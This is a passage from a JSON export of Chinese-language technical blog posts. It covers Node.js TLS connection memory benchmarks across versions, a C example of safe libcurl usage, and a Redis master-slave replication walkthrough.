\u8fde\u63a5\uff0c\u9664\u4e86 <code>close<\/code> \uff0c\u8fd8\u76d1\u542c\u4e86 <code>data<\/code> \u3001 <code>error<\/code> \u3001 <code>timeout<\/code> \u4e8b\u4ef6\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">socket.on(<span style=\"color: #66cccc;\">\"data\"<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">data<\/span>) {\n\n});\nsocket.on(<span style=\"color: #66cccc;\">\"error\"<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.warn(<span style=\"color: #66cccc;\">'tls client('<\/span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'<\/span> + socket.remotePort <span style=\"text-decoration: underline;\">+<\/span><span style=\"color: #66cccc; text-decoration: underline;\">') error('<\/span><span style=\"text-decoration: underline;\"> + err.toString() + <\/span><span style=\"color: #66cccc; text-decoration: underline;\">')'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n});\nsocket.on(<span style=\"color: #66cccc;\">\"close\"<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   console.warn(<span style=\"color: #66cccc;\">'tls client('<\/span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'<\/span> + socket.remotePort <span style=\"text-decoration: underline;\">+<\/span><span style=\"color: #66cccc; text-decoration: underline;\">') closed'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n});\nsocket.on(<span style=\"color: #66cccc;\">\"timeout\"<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   socket.destroy();\n});\n<\/pre>\n<\/div>\n\n<p>\n\u524d\u9762\u7684\u6d4b\u8bd5\u6211\u4f7f\u7528\u7684\u662f <code>node-v5.3.0<\/code> \uff0c\u6211\u4f7f\u7528 <code>node-v0.12.7<\/code> \u91cd\u65b0\u6d4b\u4e86\u51e0\u8f6e\uff0c\u6700\u7ec8 <code>rss<\/code> \u5185\u5b58\u5360\u7528\u505c\u5728 <code>145.5MB<\/code> \uff0c\u8fd9\u8fd8\u53ea\u662f <code>1000<\/code> \u4e2a <code>tls<\/code> \u8fde\u63a5\uff0c\u4f7f\u7528 <code>3000<\/code> \u4e2a <code>tls<\/code> \u8fde\u63a5\u8fdb\u884c\u6d4b\u8bd5\uff0c <code>rss<\/code> \u5185\u5b58\u5360\u7528\u505c\u5728 <code>303MB<\/code> \u3002\u518d\u6b21\u4f7f\u7528 <code>node-v5.3.0<\/code> \u6d4b\u8bd5 <code>3000<\/code> \u4e2a <code>tls<\/code> \u8fde\u63a5\uff0c <code>rss<\/code> \u5185\u5b58\u5360\u7528\u505c\u5728 <code>115MB - 130MB<\/code> \u4e4b\u95f4\uff0c\u968f\u7740\u8fde\u63a5\u7684\u589e\u51cf\u6709\u4e00\u5b9a\u7684\u6ce2\u52a8\u3002\n<\/p>\n\n<p>\n\u7531\u6b64\u770b\u6765 <code>tls<\/code> \u8fde\u63a5\u662f\u8981\u5360\u7528\u4e00\u5b9a\u5185\u5b58\u91cf\u7684\uff0c\u9ad8\u7248\u672c\u7684 <code>node<\/code> \u6539\u8fdb\u5f88\u5927\uff0c\u53ef\u4ee5\u8003\u8651\u5347\u7ea7\u4e00\u4e0b <code>node<\/code> \u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u6700\u540e\u9644\u4e0a node.js \u5404\u4e2a\u7248\u672c\u7684\u6d4b\u8bd5\u7ed3\u679c<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<table border=\"2\" cellspacing=\"0\" cellpadding=\"6\" rules=\"groups\" frame=\"hsides\">\n<caption class=\"t-above\"><span class=\"table-number\">Table 1:<\/span> 10000 tls connections<\/caption>\n\n<colgroup>\n<col  class=\"left\" \/>\n\n<col  class=\"right\" \/>\n\n<col  class=\"right\" \/>\n\n<col  class=\"right\" \/>\n<\/colgroup>\n<thead>\n<tr>\n<th scope=\"col\" class=\"left\">node.js<\/th>\n<th scope=\"col\" class=\"right\">heapTotal(MB)<\/th>\n<th scope=\"col\" class=\"right\">heapUsed(MB)<\/th>\n<th scope=\"col\" class=\"right\">rss(MB)<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td class=\"left\">node-v0.12.7<\/td>\n<td class=\"right\">158.34<\/td>\n<td class=\"right\">98.62<\/td>\n<td class=\"right\">728.26<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">node-v0.12.9<\/td>\n<td class=\"right\">239.04<\/td>\n<td class=\"right\">209.53<\/td>\n<td class=\"right\">838.40<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">node-v4.2.3<\/td>\n<td class=\"right\">86.58<\/td>\n<td class=\"right\">81.47<\/td>\n<td class=\"right\">222.97<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">node-v5.3.0<\/td>\n<td class=\"right\">96.73<\/td>\n<td class=\"right\">75.23<\/td>\n<td class=\"right\">235.11<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n\n<ul class=\"org-ul\">\n<li>\u6d4b\u8bd5\u811a\u672c\n\n<p>\n<a href=\"..\/static\/test_tls_server.js\">test_tls_server.js<\/a>\n<\/p>\n\n<p>\n<a href=\"..\/static\/test_tls_client.js\">test_tls_client.js<\/a>\n<\/p>\n<\/li>\n\n<li>\u6d4b\u8bd5\u547d\u4ee4\n\n<p>\n\u7ec8\u7aef <code>1<\/code> ( <code>tls<\/code> \u670d\u52a1\u5668)\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo bash -c <span style=\"color: #66cccc;\">\"(ulimit -n 10240; node .\/test_tls_server.js)\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u7ec8\u7aef <code>2<\/code> ( <code>tls<\/code> \u5ba2\u6237\u7aef)\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo bash -c <span style=\"color: #66cccc;\">\"(ulimit -n 10240; for (( i = 0; i &lt; 100; i++)); do echo round \\$i;<\/span><span style=\"color: #66cccc; text-decoration: underline;\"> node .\/test_tls_client.js; done;)\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u5185\u5b58\u5360\u7528\u53d6\u7684\u662f <code>tls<\/code> \u6d4b\u8bd5\u5ba2\u6237\u7aef\u9000\u51fa\u540e\uff0c\u670d\u52a1\u5668\u7aef\u6700\u540e\u5efa\u7acb\u4e86 <code>10000<\/code> \u4e2a <code>tls<\/code> \u8fde\u63a5\u65f6\u7684\u5185\u5b58\u5360\u7528\u3002<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5b89\u5168\u4f7f\u7528libcurl\u7684\u6b63\u786e\u59ff\u52bf",
  "timestamp": "2015-12-21 18:14:00",
  "tags": [
    "c"
  ],
  "body": "<p>\n\u5728\u6211\u4eec\u7684\u9879\u76ee\u4e2d\uff0c\u6570\u6b21\u9047\u5230 <code>libcurl<\/code> \u5bfc\u81f4\u7684\u5e94\u7528\u7a0b\u5e8f\u5d29\u6e83\u95ee\u9898\uff0c\u8fd9\u91cc\u603b\u7ed3\u4e86\u4e00\u4e0b\u4f7f\u7528 <code>libcurl<\/code> \u7684\u6b63\u786e\u59ff\u52bf\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span class=\"linenr\"> 1: <\/span><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;curl\/curl.h&gt;<\/span>\n<span class=\"linenr\"> 2: <\/span><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;stdint.h&gt;<\/span>\n<span class=\"linenr\"> 3: <\/span><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;string.h&gt;<\/span>\n<span class=\"linenr\"> 4: <\/span>\n<span class=\"linenr\"> 5: <\/span>\n<span class=\"linenr\"> 6: <\/span><span style=\"color: #cc99cc;\">#define<\/span> <span style=\"color: #ffcc66;\">RESPONSE_BODY_SIZE<\/span> 128\n<span class=\"linenr\"> 7: <\/span>\n<span class=\"linenr\"> 8: <\/span><span style=\"color: #99cc99;\">static<\/span> <span style=\"color: #6699cc;\">size_t<\/span> <span style=\"color: #f99157;\">write_function<\/span>(<span style=\"color: #99cc99;\">const<\/span> <span style=\"color: #6699cc;\">void<\/span> *<span style=\"color: #ffcc66;\">buffer<\/span>, <span style=\"color: #99cc99;\">const<\/span> <span style=\"color: #6699cc;\">size_t<\/span> <span style=\"color: #ffcc66;\">size<\/span>, <span style=\"color: #99cc99;\">const<\/span> <span style=\"color: #6699cc;\">size_t<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nmemb<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #6699cc; text-decoration: underline;\">void<\/span><span style=\"text-decoration: underline;\"> *<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">user_p<\/span><span style=\"text-decoration: underline;\">)<\/span>\n<span class=\"linenr\"> 9: <\/span>{\n<span class=\"linenr\">10: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">char<\/span>* <span style=\"color: #ffcc66;\">response_body<\/span> = (<span style=\"color: #6699cc;\">char<\/span>*)user_p;\n<span class=\"linenr\">11: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">uint32_t<\/span> <span style=\"color: #ffcc66;\">response_body_len<\/span> = strlen(response_body);\n<span class=\"linenr\">12: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">uint32_t<\/span> <span style=\"color: #ffcc66;\">len<\/span> = size*nmemb;\n<span class=\"linenr\">13: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (len &gt; RESPONSE_BODY_SIZE - response_body_len - 1) {\n<span class=\"linenr\">14: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   len = RESPONSE_BODY_SIZE - response_body_len - 1;\n<span class=\"linenr\">15: <\/span><span style=\"background-color: #515151;\"> <\/span>   }\n<span id=\"coderef-curl_write_function_buffer\" class=\"coderef-off\"><span class=\"linenr\">16: <\/span><span style=\"background-color: #515151;\"> <\/span>   memcpy(response_body + response_body_len, buffer, len);<\/span>\n<span id=\"coderef-curl_write_function_return\" class=\"coderef-off\"><span class=\"linenr\">17: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> size*nmemb;<\/span>\n<span class=\"linenr\">18: <\/span>}\n<span class=\"linenr\">19: <\/span>\n<span class=\"linenr\">20: <\/span><span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">main<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">argc<\/span>, <span style=\"color: #6699cc;\">char<\/span> *<span style=\"color: #ffcc66;\">argv<\/span>[])\n<span class=\"linenr\">21: <\/span>{\n<span class=\"linenr\">22: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">const<\/span> <span style=\"color: #6699cc;\">char<\/span>* <span style=\"color: #ffcc66;\">url<\/span> = <span style=\"color: #66cccc;\">\"http:\/\/www.example.com\/dns_servers\"<\/span>;\n<span class=\"linenr\">23: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">struct<\/span> <span style=\"color: #6699cc;\">curl_slist<\/span> *<span style=\"color: #ffcc66;\">headers<\/span> = <span style=\"color: #6699cc;\">NULL<\/span>;\n<span class=\"linenr\">24: <\/span><span style=\"background-color: #515151;\"> <\/span>   headers = curl_slist_append(headers, <span style=\"color: #66cccc;\">\"Content-Type: application\/json\"<\/span>);\n<span class=\"linenr\">25: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">const<\/span> <span style=\"color: #6699cc;\">char<\/span>* <span style=\"color: #ffcc66;\">request_body<\/span> = <span style=\"color: #66cccc;\">\"{\\\"host\\\": \\\"8.8.8.8\\\", \\\"port\\\": 53}\"<\/span>;\n<span class=\"linenr\">26: <\/span>\n<span class=\"linenr\">27: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">CURL<\/span> *<span style=\"color: #ffcc66;\">curl<\/span>;\n<span class=\"linenr\">28: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">CURLcode<\/span> <span style=\"color: #ffcc66;\">res<\/span>;\n<span class=\"linenr\">29: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">char<\/span> <span style=\"color: #ffcc66;\">response_body<\/span>[RESPONSE_BODY_SIZE] = {<span style=\"color: #66cccc;\">'\\0'<\/span>};\n<span class=\"linenr\">30: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">long<\/span> <span style=\"color: #ffcc66;\">response_code<\/span> = 0;\n<span class=\"linenr\">31: <\/span>\n<span class=\"linenr\">32: <\/span><span style=\"background-color: #515151;\"> <\/span>   curl = curl_easy_init();\n<span class=\"linenr\">33: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(curl) {\n<span class=\"linenr\">34: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_URL, url);\n<span class=\"linenr\">35: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n<span class=\"linenr\">36: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_body);\n<span class=\"linenr\">37: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(request_body));\n<span id=\"coderef-curl_nosignal\" class=\"coderef-off\"><span class=\"linenr\">38: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);<\/span>\n<span class=\"linenr\">39: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);\n<span class=\"linenr\">40: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);\n<span class=\"linenr\">41: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_body);\n<span class=\"linenr\">42: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res = curl_easy_perform(curl);\n<span class=\"linenr\">43: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (res == CURLE_OK) {\n<span id=\"coderef-curl_response_code\" class=\"coderef-off\"><span class=\"linenr\">44: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &amp;response_code<span style=\"text-decoration: underline;\">);<\/span><\/span>\n<span class=\"linenr\">45: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span class=\"linenr\">46: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(res != CURLE_OK) {\n<span class=\"linenr\">47: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"request to %s error(%d): %s\"<\/span>, url, res, curl_easy_s<span style=\"text-decoration: underline;\">trerror(res));<\/span>\n<span class=\"linenr\">48: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span class=\"linenr\">49: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   curl_easy_cleanup(curl);\n<span class=\"linenr\">50: <\/span><span style=\"background-color: #515151;\"> <\/span>   }\n<span class=\"linenr\">51: <\/span>\n<span class=\"linenr\">52: <\/span><span style=\"background-color: #515151;\"> <\/span>   curl_slist_free_all(headers);\n<span class=\"linenr\">53: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (response_code == 201) {\n<span class=\"linenr\">54: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"request to %s successful: %s\\n\"<\/span>, url, response_body);\n<span class=\"linenr\">55: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n<span class=\"linenr\">56: <\/span><span style=\"background-color: #515151;\"> <\/span>   }\n<span class=\"linenr\">57: <\/span>\n<span class=\"linenr\">58: <\/span><span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"request to %s response failed(%ld): %s\\n\"<\/span>, url, response_co<span style=\"text-decoration: underline;\">de, response_body);<\/span>\n<span class=\"linenr\">59: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 1;\n<span class=\"linenr\">60: <\/span>}\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u7684\u793a\u4f8b\u4ee3\u7801\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff1a\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> \u884c <a href=\"#coderef-curl_write_function_buffer\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_write_function_buffer');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_write_function_buffer');\">16<\/a> <\/dt><dd>buffer\u4e0d\u662f <code>\\0<\/code> \u7ed3\u5c3e\u7684\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-curl_write_function_return\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_write_function_return');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_write_function_return');\">17<\/a> <\/dt><dd>\u603b\u662f\u8fd4\u56de <code>size*nmemb<\/code>\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-curl_nosignal\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_nosignal');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_nosignal');\">38<\/a> <\/dt><dd>\u603b\u662f\u8bbe\u7f6e\u8fd9\u4e2a\u9009\u9879\n\n<p>\n<code>libcurl<\/code> \u4e0d\u652f\u6301\u5f02\u6b65 <code>dns<\/code> \u89e3\u6790\u65f6\uff0c\u4f1a\u901a\u8fc7 <code>signal<\/code> \u7684\u65b9\u5f0f\u5b9e\u73b0 <code>dns<\/code> \u89e3\u6790\u8bbe\u7f6e\u8d85\u65f6\uff0c <code>signal<\/code> \u4f1a\u5bfc\u81f4\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u5d29\u6e83\uff0c\u540e\u53f0\u670d\u52a1\u901a\u5e38\u90fd\u662f\u591a\u7ebf\u7a0b\u7684\uff0c\u6240\u4ee5\u5e94\u8be5\u603b\u662f\u8bbe\u7f6e\u8fd9\u4e2a\u9009\u9879\uff08\u4f46\u662f <code>libcurl<\/code> \u4e0d\u652f\u6301\u5f02\u6b65 <code>dns<\/code> \u89e3\u6790\u65f6\uff0c\u8d85\u65f6\u9009\u9879\u5c06\u88ab\u5ffd\u7565\uff09\u3002\n<\/p>\n\n<p>\n\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c <code>curl --version<\/code> \u547d\u4ee4\u6216\u8c03\u7528 <code>curl_version<\/code> \u51fd\u6570\u67e5\u770b <code>libcurl<\/code> \u662f\u5426\u652f\u6301\u5f02\u6b65 <code>dns<\/code> \u89e3\u6790\uff0c\u8c03\u7528 <code>curl_version_info<\/code> \u51fd\u6570\u8fd8\u53ef\u4ee5\u83b7\u5f97\u5177\u4f53\u7684 <code>c-ares<\/code> \u5e93\u7248\u672c\u53f7\u3002\n<\/p>\n\n<p>\n\u7f16\u8bd1 <code>libcurl<\/code> \u65f6\uff0c\u901a\u8fc7\u4e3a  <code>configure<\/code> \u6307\u5b9a <code>--enable-threaded-resolver<\/code> \u6216 <code>--enable-ares<\/code> \u9009\u9879\u542f\u7528\u5f02\u6b65 <code>dns<\/code> \u89e3\u6790\u3002\n<\/p>\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-curl_response_code\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_response_code');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_response_code');\">44<\/a> <\/dt><dd>\u72b6\u6001\u54cd\u5e94\u7801\u53d8\u91cf\u5fc5\u987b\u662f <code>long<\/code> \u7c7b\u578b\n\n<p>\n\u5426\u5219\u4f1a\u7531\u4e8e\u5185\u5b58\u8d8a\u754c\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u3002<\/p>\n<\/dd>\n<\/dl>\n"
},
{
  "title": "redis\u9ad8\u53ef\u7528\u6027\u57fa\u7840\uff1aMaster-Slave",
  "timestamp": "2015-12-25 21:19:00",
  "tags": [
    "redis"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7406\u89e3Master-Slave<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<code>Master-Slave<\/code> \u5e38\u5e38\u7ffb\u8bd1\u4e3a <code>\u4e3b\/\u5907<\/code> \uff0c\u662f\u4e00\u79cd\u9ad8\u53ef\u7528\u6027\uff08 <a href=\"https:\/\/en.wikipedia.org\/wiki\/High_availability\">High Availability<\/a> \uff09\u65b9\u6848\u3002\n<\/p>\n\n<p>\n\u4e3e\u4e2a\u751f\u6d3b\u4e2d\u7684 <code>Master-Slave<\/code> \u4f8b\u5b50\uff1a\n<\/p>\n\n<blockquote>\n<p>\n\u53c2\u52a0\u8003\u8bd5\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4f1a\u51c6\u5907\u4e24\u652f\u94a2\u7b14\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u53ea\u4f1a\u4f7f\u7528\u4e00\u652f\uff0c\u51fa\u95ee\u9898\u4e86\u624d\u4f1a\u6362\u53e6\u5916\u4e00\u652f\u3002\n<\/p>\n<\/blockquote>\n\n<p>\n\u6240\u4ee5\u5b9e\u65bd <code>Master-Slave<\/code> \u662f\u6709\u6210\u672c\u7684\uff0c\u81f3\u5c11\u4f1a\u6709 <code>50%<\/code> \u7684\u8d44\u6e90\u6d6a\u8d39\uff08\u591a\u5907\u51e0\u652f\u6d6a\u8d39\u4f1a\u66f4\u591a\uff09\uff0c\u53ef\u4ee5\u8ba9 <code>Slave<\/code> \u627f\u62c5\u4e00\u90e8\u5206\u5de5\u4f5c\u6765\u5145\u5206\u5229\u7528\u8d44\u6e90\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">Redis\u7684Master-Slave<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u5173\u4e8e <code>Redis<\/code> \u7684 <code>Master-Slave<\/code> \uff0c\u300a<a href=\"http:\/\/redis.io\/topics\/replication\">Replication \u2013 Redis<\/a>\u300b \u6709\u8be6\u5c3d\u63cf\u8ff0\u3002\n<\/p>\n\n<p>\n\u9700\u8981\u6ce8\u610f\u7684\u662f <code>Redis<\/code> \u7684 <code>Master-Slave<\/code> \u4e0d\u80fd\u4fdd\u8bc1\u7edd\u5bf9\u4e0d\u4e22\u6570\u636e\uff0c\u800c\u662f\u4e22\u5931\u4e00\u5c0f\u6bb5\u65f6\u95f4\u5185\uff08\u5982\uff1a1\u79d2\u949f\uff09\u7684\u6570\u636e\u3002\n<\/p>\n\n<p>\n\u4e0b\u9762\u5f00\u59cb <code>Redis<\/code> \u7684 <code>Master-Slave<\/code> \u5b9e\u8df5\uff0c\u4f7f\u7528\u7684 <code>redis<\/code> \u7248\u672c\u4e3a <code>3.0.6<\/code> \u3002\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">\u521b\u5efaMaster\u7ed3\u70b9<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<ul class=\"org-ul\">\n<li>redis\u914d\u7f6e\u6587\u4ef6\n\n<p>\n\u4ece <code>\/etc\/redis.conf<\/code> \u62f7\u8d1d\u4e00\u4efd\u8fdb\u884c\u4fee\u6539\uff0c\u65e0\u5173\u7684\u914d\u7f6e\u9879\u5df2\u53bb\u6389\uff0c\u4f7f\u7528\u9ed8\u8ba4\u503c\u5373\u53ef\u3002\n<\/p>\n\n<p>\n<a href=\"..\/static\/redis-master.conf\">redis-master.conf<\/a>\n<\/p>\n<\/li>\n\n<li>\u5728\u7ec8\u7aef <code>1<\/code> \u542f\u52a8 <code>Master<\/code> \u7ed3\u70b9\n\n<p>\n<code>redis-server .\/redis-master.conf<\/code>\n<\/p>\n<\/li>\n\n<li>\u4f7f\u7528 <code>redis-cli<\/code> \u8fde\u63a5 <code>Master<\/code>\n\n<pre class=\"example\">\n$ redis-cli -p 6379\n127.0.0.1:6379&gt;\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">\u521b\u5efaSlave\u7ed3\u70b9<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<ul class=\"org-ul\">\n<li>redis\u914d\u7f6e\u6587\u4ef6\n\n<p>\n\u4ece <code>redis-master.conf<\/code> \u62f7\u8d1d\u4e00\u4efd\u8fdb\u884c\u4fee\u6539\uff0c\u4e3b\u8981\u662f\u4fee\u6539\u76d1\u542c\u7684\u7aef\u53e3\u53f7\uff08 <code>6380<\/code> \uff09\u3001PID\u6587\u4ef6\u540d\u3001DB\u6587\u4ef6\u540d\uff0c\n<\/p>\n\n<p>\n\u6700\u5173\u952e\u7684\u662f\u8bbe\u7f6e\u4e3a <code>Master<\/code> \u7684 <code>Slave<\/code> <code>slaveof 127.0.0.1 6379<\/code> \u3002\n<\/p>\n\n<p>\n<a href=\"..\/static\/redis-slave.conf\">redis-slave.conf<\/a>\n<\/p>\n<\/li>\n\n<li>\u5728\u7ec8\u7aef <code>2<\/code> \u542f\u52a8 <code>Slave<\/code> \u7ed3\u70b9\n\n<p>\n<code>redis-server .\/redis-slave.conf<\/code>\n<\/p>\n<\/li>\n\n<li>\u4f7f\u7528 <code>redis-cli<\/code> \u8fde\u63a5 <code>Slave<\/code>\n\n<pre class=\"example\">\n$ redis-cli -p 6380\n127.0.0.1:6380&gt;\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">\u6f14\u793aMaster\u5199Slave\u8bfb\u7684\u573a\u666f<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<ul class=\"org-ul\">\n<li>\u5728 <code>Master<\/code> \u5199\u5165\n\n<pre class=\"example\">\n127.0.0.1:6379&gt; set hello world\nOK\n<\/pre>\n<\/li>\n\n<li>\u4ece <code>Slave<\/code> \u8bfb\u53d6\n\n<pre class=\"example\">\n127.0.0.1:6380&gt; get hello\n\"world\"\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-4\" class=\"outline-3\">\n<h3 id=\"sec-2-4\">\u6f14\u793aSlave\u6302\u6389\u7684\u573a\u666f<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-4\">\n<ul class=\"org-ul\">\n<li>\u5173\u95ed <code>Slave<\/code> \n\n<pre class=\"example\">\n127.0.0.1:6380&gt; shutdown\nnot connected&gt;\n<\/pre>\n\n<p>\n\u7ec8\u7aef <code>2<\/code> \u4e0a\u7684 <code>redis-server<\/code> \u4f1a\u81ea\u52a8\u9000\u51fa\uff0c\u6ce8\u610f\u5230\u5b83\u9000\u51fa\u524d\u8fdb\u884c\u4e86\u5b58\u76d8\u3002\n<\/p>\n<\/li>\n\n<li>\u5728 <code>Master<\/code> \u5199\u5165\n\n<pre class=\"example\">\n127.0.0.1:6379&gt; set hello redis\nOK\n<\/pre>\n<\/li>\n\n<li>\u5728\u7ec8\u7aef <code>2<\/code> \u4e0a\u518d\u6b21\u542f\u52a8 <code>Slave<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">redis-server .\/redis-slave.conf\n<\/pre>\n<\/div>\n\n<p>\n\u4ece\u65e5\u5fd7\u4e0a\u53ef\u4ee5\u770b\u5230 <code>Slave<\/code> 